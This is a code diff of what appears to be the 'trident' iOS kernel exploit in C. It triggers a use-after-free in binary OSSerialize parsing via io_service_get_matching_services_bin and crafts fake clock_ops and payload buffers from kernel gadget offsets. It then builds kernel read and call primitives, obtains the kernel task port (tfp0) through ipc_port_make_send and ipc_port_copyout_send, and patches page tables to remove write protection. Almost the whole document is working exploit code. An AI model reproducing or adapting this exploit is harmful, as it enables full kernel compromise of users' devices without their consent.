@@ -15,26 +15,25 @@
 
 #define kOSSerializeBinarySignature "\323\0\0"
 
-#define TTB_SIZE            4096
-#define L1_SECT_S_BIT       (1 << 16)
-#define L1_SECT_PROTO       (1 << 1)        /* 0b10 */
-#define L1_SECT_AP_URW      (1 << 10) | (1 << 11)
-#define L1_SECT_APX         (1 << 15)
-#define L1_SECT_DEFPROT     (L1_SECT_AP_URW | L1_SECT_APX)
-#define L1_SECT_SORDER      (0)            /* 0b00, not cacheable, strongly ordered. */
-#define L1_SECT_DEFCACHE    (L1_SECT_SORDER)
-#define L1_PROTO_TTE(entry) (entry | L1_SECT_S_BIT | L1_SECT_DEFPROT | L1_SECT_DEFCACHE)
-#define L1_PAGE_PROTO       (1 << 0)
-#define L1_COARSE_PT        (0xFFFFFC00)
-#define PT_SIZE             256
-#define L2_PAGE_APX         (1 << 9)
+#define TTB_SIZE                    (4096)
+#define L1_SECT_S_BIT               (1 << 16)
+#define L1_SECT_PROTO               (1 << 1)        /* 0b10 */
+#define L1_SECT_AP_URW              (1 << 10) | (1 << 11)
+#define L1_SECT_APX                 (1 << 15)
+#define L1_SECT_DEFPROT             (L1_SECT_AP_URW | L1_SECT_APX)
+#define L1_SECT_SORDER              (0)             /* 0b00, not cacheable, strongly ordered. */
+#define L1_SECT_DEFCACHE            (L1_SECT_SORDER)
+#define L1_PROTO_TTE(entry)         (entry | L1_SECT_S_BIT | L1_SECT_DEFPROT | L1_SECT_DEFCACHE)
+#define L1_PAGE_PROTO               (1 << 0)
+#define L1_COARSE_PT                (0xFFFFFC00)
+#define PT_SIZE                     (256)
+#define L2_PAGE_APX                 (1 << 9)
 
-#define CHUNK_SIZE          0x800
+#define CHUNK_SIZE                  (0x800)
 
 #define WRITE_IN(buf, data)         do { *(uint32_t *)(buf + bufpos) = (data); bufpos += 4; } while(0)
 
 #define KERN_POINTER_VALID(val)     ((val) >= 0x80000000 && (val) != 0xffffffff)
-#define PAYLOAD_TO_PEXPLOIT         (-76)
 #define PEXPLOIT_TO_UAF_PAYLOAD     (8)
 #define UAF_PAYLOAD_OFFSET          (0x20)
 
@@ -52,30 +51,37 @@ static const char *lockfile = "/tmp/.trident_lock";
 static int fildes[2];
 static clock_serv_t clk_battery;
 static clock_serv_t clk_realtime;
-static uint32_t pipebuf;
-static uint32_t cpipe;
+static uint32_t pipebuf = 0;
+static uint32_t cpipe = 0;
 static unsigned char pExploit[128];
 
-static uint32_t write_gadget;
-static vm_offset_t vm_kernel_addrperm;
+static vm_offset_t vm_kernel_addrperm = 0;
 
-static uint32_t tte_virt;
-static uint32_t tte_phys;
-static uint32_t flush_dcache;
-static uint32_t invalidate_tlb;
-
-static uid_t myuid = 0;
-static uint32_t myproc=0;
-static uint32_t mycred=0;
+static uint32_t tte_virt = 0;
+static uint32_t tte_phys = 0;
+static uint32_t flush_dcache = 0;
+static uint32_t invalidate_tlb = 0;
+static uint32_t current_task_func = 0;
+static uint32_t ipc_port_make_send_func = 0;
+static uint32_t ipc_port_copyout_send_func = 0;
 
 static mach_port_t tfp0 = 0;
 
+static unsigned char clock_ops_backup[] = {
+    0x00, 0x00, 0x00, 0x00, // [00] rtclock.getattr
+    0x00, 0x00, 0x00, 0x00, // [04] calend_config
+    0x00, 0x00, 0x00, 0x00, // [08] calend_init
+    0x00, 0x00, 0x00, 0x00, // [0C] calend_gettime
+    0x00, 0x00, 0x00, 0x00, // [10] calend_getattr
+};
+
+
 static unsigned char clock_ops_overwrite[] = {
     0x00, 0x00, 0x00, 0x00, // [00] (rtclock.getattr): address of OSSerializer::serialize (+1)
-    0x00, 0x00, 0x00, 0x00, // [04] (calend_config): NULL
-    0x00, 0x00, 0x00, 0x00, // [08] (calend_init): NULL
-    0x00, 0x00, 0x00, 0x00, // [0C] (calend_gettime): address of calend_gettime (+1)
-    0x00, 0x00, 0x00, 0x00, // [10] (calend_getattr): address of _bufattr_cpx (+1)
+    0x00, 0x00, 0x00, 0x00, // [04] (calend_config)  : NULL
+    0x00, 0x00, 0x00, 0x00, // [08] (calend_init)    : NULL
+    0x00, 0x00, 0x00, 0x00, // [0C] (calend_gettime) : address of calend_gettime (+1)
+    0x00, 0x00, 0x00, 0x00, // [10] (calend_getattr) : address of _bufattr_cpx (+1)
 };
 
 static unsigned char uaf_payload_buffer[] = {
@@ -174,21 +180,22 @@ static uint32_t kwrite32(uint32_t addr, uint32_t val)
     return val;
 }
 
-static uint32_t exec_prim(uint32_t fct, uint32_t arg1, uint32_t arg2)
+static kern_return_t exec_prim(uint32_t fct, uint32_t arg1, uint32_t arg2)
 {
     int attr;
     unsigned int attrCnt;
     char data[64];
+    kern_return_t err = KERN_SUCCESS;
     
     write(fildes[1], "AAAABBBB", 8);
     write(fildes[1], &arg1, 4);
     write(fildes[1], &arg2, 4);
     write(fildes[1], &fct, 4);
-    uint32_t ret = clock_get_attributes(clk_realtime, pipebuf, &attr, &attrCnt);
-    
+    err = clock_get_attributes(clk_realtime, pipebuf, &attr, &attrCnt);
+
     read(fildes[0], data, 64);
     
-    return ret;
+    return err;
 }
 
 static uint32_t kread32_prim(uint32_t addr)
@@ -197,12 +204,6 @@ static uint32_t kread32_prim(uint32_t addr)
     unsigned int attrCnt;
     
     return clock_get_attributes(clk_battery, addr, &attr, &attrCnt);
-}
-
-static void kwrite32_prim(uint32_t addr, uint32_t value)
-{
-    addr -= 0xc;
-    exec_prim(write_gadget, addr, value);
 }
 
 static void exec_flush_dcache(void)
@@ -215,33 +216,47 @@ static void exec_invalidate_tlb(void)
     exec_prim(invalidate_tlb, 0, 0);
 }
 
-static void patch_page_table(int hasTFP0, uint32_t tte_virt, uint32_t tte_phys, uint32_t flush_dcache, uint32_t invalidate_tlb, uint32_t page)
+static uint32_t exec_current_task(void)
+{
+    return (uint32_t)exec_prim(current_task_func, 0, 0);
+}
+
+static uint32_t exec_ipc_port_make_send(uint32_t arg0)
+{
+    return (uint32_t)exec_prim(ipc_port_make_send_func, arg0, 0);
+}
+
+static task_t exec_ipc_port_copyout_send(uint32_t arg0, uint32_t arg1)
+{
+    return (task_t)exec_prim(ipc_port_copyout_send_func, arg0, arg1);
+}
+
+static void patch_page_table(uint32_t tte_virt, uint32_t tte_phys, uint32_t flush_dcache, uint32_t invalidate_tlb, uint32_t page)
 {
     uint32_t i = page >> 20;
     uint32_t j = (page >> 12) & 0xFF;
     uint32_t addr = tte_virt+(i<<2);
-    uint32_t entry = hasTFP0 == 0 ? kread32(addr) : kread32_prim(addr);
+    uint32_t entry = kread32(addr);
     if ((entry & L1_PAGE_PROTO) == L1_PAGE_PROTO)
     {
         uint32_t page_entry = ((entry & L1_COARSE_PT) - tte_phys) + tte_virt;
         uint32_t addr2 = page_entry+(j<<2);
-        uint32_t entry2 = hasTFP0 == 0 ? kread32(addr2) : kread32_prim(addr2);
+        uint32_t entry2 = kread32(addr2);
         if (entry2)
         {
             uint32_t new_entry2 = (entry2 & (~L2_PAGE_APX));
-            hasTFP0 == 0 ? kwrite32(addr2, new_entry2) : kwrite32_prim(addr2, new_entry2);
+            kwrite32(addr2, new_entry2);
         }
     }
     else if ((entry & L1_SECT_PROTO) == L1_SECT_PROTO)
     {
         uint32_t new_entry = L1_PROTO_TTE(entry);
         new_entry &= ~L1_SECT_APX;
-        hasTFP0 == 0 ? kwrite32(addr, new_entry) : kwrite32_prim(addr, new_entry);
+        kwrite32(addr, new_entry);
     }
     
     exec_flush_dcache();
     exec_invalidate_tlb();
-    
 }
 
 
@@ -283,7 +298,7 @@ int trident(addr_t slide)
 {
     kern_return_t retval = KERN_SUCCESS;
     
-    mach_port_name_t kernel_task = MACH_PORT_NULL;
+    mach_port_name_t ktask = MACH_PORT_NULL;
     struct stat buf;
     mach_port_t master = 0;
     mach_port_t res;
@@ -330,22 +345,22 @@ int trident(addr_t slide)
 retry:
     bzero((void *)fakebuf, fakesize);
     
-    *(uint32_t *)(clock_ops_overwrite + 0x00) = koffset(off_OSSerializer_serialize) + slide;
+    *(uint32_t *)(clock_ops_overwrite + 0x00) = slide + koffset(off_OSSerializer_serialize);
     *(uint32_t *)(clock_ops_overwrite + 0x04) = 0;
     *(uint32_t *)(clock_ops_overwrite + 0x08) = 0;
-    *(uint32_t *)(clock_ops_overwrite + 0x0C) = koffset(off_calend_gettime) + slide;
-    *(uint32_t *)(clock_ops_overwrite + 0x10) = koffset(off_bufattr_cpx) + slide;
+    *(uint32_t *)(clock_ops_overwrite + 0x0C) = slide + koffset(off_calend_gettime);
+    *(uint32_t *)(clock_ops_overwrite + 0x10) = slide + koffset(off_bufattr_cpx);
     
     *(uint32_t *)(uaf_payload_buffer + 0x00) = (uint32_t)clock_ops_overwrite;               // =r0
-    *(uint32_t *)(uaf_payload_buffer + 0x04) = koffset(off_clock_ops) + slide;              // =r1
-    *(uint32_t *)(uaf_payload_buffer + 0x08) = koffset(off_copyin) + slide;                 // =copyin(r0, r1, 0x14) // r2=0x14
+    *(uint32_t *)(uaf_payload_buffer + 0x04) = slide + koffset(off_clock_ops);              // =r1
+    *(uint32_t *)(uaf_payload_buffer + 0x08) = slide + koffset(off_copyin);                 // =copyin(r0, r1, 0x14) // r2=0x14
     *(uint32_t *)(uaf_payload_buffer + 0x0C) = 0;
-    *(uint32_t *)(uaf_payload_buffer + 0x10) = koffset(off_OSSerializer_serialize) + slide;
-    *(uint32_t *)(uaf_payload_buffer + 0x14) = koffset(off_bx_lr) + slide;
+    *(uint32_t *)(uaf_payload_buffer + 0x10) = slide + koffset(off_OSSerializer_serialize);
+    *(uint32_t *)(uaf_payload_buffer + 0x14) = slide + koffset(off_bx_lr);
     *(uint32_t *)(uaf_payload_buffer + 0x18) = 0;
-    *(uint32_t *)(uaf_payload_buffer + 0x1C) = koffset(off_OSSymbol_getMetaClass) + slide;
-    *(uint32_t *)(uaf_payload_buffer + 0x20) = koffset(off_bx_lr) + slide;
-    *(uint32_t *)(uaf_payload_buffer + 0x24) = koffset(off_bx_lr) + slide;
+    *(uint32_t *)(uaf_payload_buffer + 0x1C) = slide + koffset(off_OSSymbol_getMetaClass);
+    *(uint32_t *)(uaf_payload_buffer + 0x20) = slide + koffset(off_bx_lr);
+    *(uint32_t *)(uaf_payload_buffer + 0x24) = slide + koffset(off_bx_lr);
     
     fakebuf->magic = 0x41424344;    // 0x00
     fakebuf->pad1  = 0x41414141;    // 0x04
@@ -382,6 +397,12 @@ goto retry; \
 val; \
 }) \
 
+    *(uint32_t *)(clock_ops_backup + 0x00) = kread32_uaf(slide + koffset(off_clock_ops) + 0x00);
+    *(uint32_t *)(clock_ops_backup + 0x04) = 0;
+    *(uint32_t *)(clock_ops_backup + 0x08) = 0;
+    *(uint32_t *)(clock_ops_backup + 0x0C) = slide + koffset(off_calend_gettime);
+    *(uint32_t *)(clock_ops_backup + 0x10) = kread32_uaf(slide + koffset(off_clock_ops) + 0x10);
+    
     uint32_t self_task_addr = kread32_uaf(self_port_addr + koffset(off_ipc_port_ip_kobject));
     LOG("self_task_addr: " ADDR, self_task_addr);
     
@@ -421,20 +442,20 @@ val; \
     
     WRITE_IN(data, kOSSerializeDictionary | kOSSerializeEndCollection | 0x10);
     // pre-9.1 doesn't accept strings as keys, but duplicate keys :D
-    WRITE_IN(data, kOSSerializeSymbol | 4);
+    WRITE_IN(data, kOSSerializeSymbol     | 4);
     WRITE_IN(data, 0x00327973);                 // "sy2"
     // our key is a OSString object that will be freed
-    WRITE_IN(data, kOSSerializeString | 4);
+    WRITE_IN(data, kOSSerializeString     | 4);
     WRITE_IN(data, 0x00327973);                 // irrelevant
     
     // now this will free the string above
-    WRITE_IN(data, kOSSerializeObject | 1);     // ref to "sy2"
-    WRITE_IN(data, kOSSerializeBoolean | 1);    // lightweight value
+    WRITE_IN(data, kOSSerializeObject     | 1);     // ref to "sy2"
+    WRITE_IN(data, kOSSerializeBoolean    | 1);    // lightweight value
     
     // and this is the key for the value below
-    WRITE_IN(data, kOSSerializeObject | 1);     // ref to "sy2" again
+    WRITE_IN(data, kOSSerializeObject     | 1);     // ref to "sy2" again
     
-    WRITE_IN(data, kOSSerializeData | 0x14);
+    WRITE_IN(data, kOSSerializeData       | 0x14);
     WRITE_IN(data, pipe_buffer + UAF_PAYLOAD_OFFSET);               // [00] address of uaf_payload_buffer
     WRITE_IN(data, 0x41414141);                                     // [04] dummy
     WRITE_IN(data, pipe_buffer + UAF_PAYLOAD_OFFSET - 0x8);         // [08] address of uaf_payload_buffer - 8
@@ -450,6 +471,8 @@ val; \
     /* trigger the bug */
     err = io_service_get_matching_services_bin(master, data, bufpos, &res);
     LOG("io_service_get_matching_services_bin: %x", err);
+    
+    
     
     uint32_t readtest = 0;
     
@@ -493,48 +516,35 @@ val; \
     
     read(fildes[0], data, 4096);
     
-    /* test write primitive */
-    LOG("testing write primitive");
-    write_gadget = koffset(off_write_gadget) + slide;
-    kwrite32_prim(pipebuf, 0x41424142);
-    readtest = kread32_prim(pipebuf);
-    if(readtest != 0x41424142)
-    {
-        ERR("write test failed " ADDR " != " ADDR, readtest, 0x41424142);
-        goto fail;
-    }
+    // set exec prim
+    current_task_func           = slide + koffset(off_current_task);
+    ipc_port_make_send_func     = slide + koffset(off_ipc_port_make_send);
+    ipc_port_copyout_send_func  = slide + koffset(off_ipc_port_copyout_send);
+    
     
     // tfp0
-    
     // ref: siguza's cl0ver https://blog.siguza.net/cl0ver/
     // *task_addr = ipc_port_copyout_send(ipc_port_make_send(kernel_task->itk_self), current_task()->itk_space);
     
-    // 8.4.1 n42 koffsets
-    // itk_self: 0xa4
-    // itk_space: 0x1a8
-    // ipc_port_copyout_send: 800162fc
-    // ipc_port_make_send: 80016274
+    uint32_t current_task = exec_current_task();
+    LOG("current_task: " ADDR, current_task);
     
-    uint32_t current_task = exec_prim(0x8003a3f1 + slide, 0, 0);
-    LOG("current_task: 0x%08x", current_task);
+    uint32_t current_task_itk_space = kread32_prim(current_task + koffset(off_task_itk_space));
+    LOG("current_task()->itk_space: " ADDR, current_task_itk_space);
     
-    uint32_t current_task_itk_space = kread32_prim(current_task + 0x1a8);
-    LOG("current_task()->itk_space: 0x%08x", current_task_itk_space);
+    uint32_t kernel_task = kread32_prim(koffset(off_kernel_task) + slide);
+    LOG("kernel_task: " ADDR, kernel_task);
     
-    uint32_t kernel_task_addr = kread32_prim(0x8040a098 + slide);
-    LOG("kernel_task: 0x%08x", kernel_task_addr);
+    uint32_t kernel_task_itk_self = kread32_prim(kernel_task + koffset(off_task_itk_self));
+    LOG("kernel_task->itk_self: " ADDR, kernel_task_itk_self);
+        
+    uint32_t sright = exec_ipc_port_make_send(kernel_task_itk_self);
+    LOG("sright: " ADDR, sright);
     
-    uint32_t kernel_task_itk_self = kread32_prim(kernel_task_addr + 0xa4);
-    LOG("kernel_task->itk_self: 0x%08x", kernel_task_itk_self);
+    ktask = exec_ipc_port_copyout_send(sright, current_task_itk_space);
     
-    uint32_t sright = exec_prim(0x80016275 + slide, kernel_task_itk_self, 0);
-    LOG("sright: 0x%08x", sright);
-    
-    task_t tret = (task_t)exec_prim(0x800162fd + slide, sright, current_task_itk_space);
-    LOG("tret: 0x%08x", tret);
-    
-    tfp0 = tret;
-    LOG("got tfp0: %x", tfp0);
+    tfp0 = ktask;
+    LOG("got tfp0: " ADDR, tfp0);
     
     LOG("checking tfp0");
     mach_vm_address_t page = 0;
@@ -565,7 +575,7 @@ val; \
         goto fail;
     }
     
-    LOG("data: 0x%08x 0x%08x", check[0], check[1]);
+    LOG("data: " ADDR " " ADDR, check[0], check[1]);
     if(check[0] != testdata[0] || check[1] != testdata[1])
     {
         ERR("data mismatch");
@@ -580,8 +590,18 @@ val; \
         goto fail;
     }
     
-    if (port_fds[0] > 0)  close(port_fds[0]);
-    if (port_fds[1] > 0)  close(port_fds[1]);
+    // cleanup
+    LOG("cleanup");
+    retval = mach_vm_write(tfp0, (slide + koffset(off_clock_ops)), (vm_offset_t)clock_ops_backup, 0x14);
+    LOG("mach_vm_write: %s", mach_error_string(retval));
+    if(retval != KERN_SUCCESS)
+    {
+        ERR("mach_vm_write failed");
+        goto fail;
+    }
+    
+    if (port_fds[0] > 0) close(port_fds[0]);
+    if (port_fds[1] > 0) close(port_fds[1]);
     if(fakebuf) free((void *)fakebuf);
     
     return 0;
@@ -589,8 +609,8 @@ val; \
 fail:
     ERR("trident failed");
     tfp0 = MACH_PORT_NULL;
-    if (port_fds[0] > 0)  close(port_fds[0]);
-    if (port_fds[1] > 0)  close(port_fds[1]);
+    if (port_fds[0] > 0) close(port_fds[0]);
+    if (port_fds[1] > 0) close(port_fds[1]);
     if(fakebuf) free((void *)fakebuf);
     return -1;
 }
